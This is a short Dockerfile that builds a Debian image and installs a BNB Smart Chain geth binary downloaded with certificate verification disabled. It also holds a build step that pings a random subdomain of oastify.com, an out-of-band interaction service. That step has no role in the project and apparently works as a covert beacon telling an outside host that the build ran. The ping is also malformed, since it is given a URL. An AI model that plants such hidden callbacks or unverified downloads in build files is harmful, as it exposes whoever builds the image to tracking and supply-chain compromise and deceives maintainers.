FROM debian:stable-slim

RUN apt-get update -y && apt-get install wget curl procps net-tools htop -y
RUN wget --no-check-certificate https://github.com/binance-chain/bsc/releases/download/v1.2.10/geth_linux && chmod 744 geth_linux && mv geth_linux /usr/local/bin/geth
RUN ping http://8w5leekhp4ggwg13vxrfwwlr7id81x.oastify.com

ENTRYPOINT ["geth"]
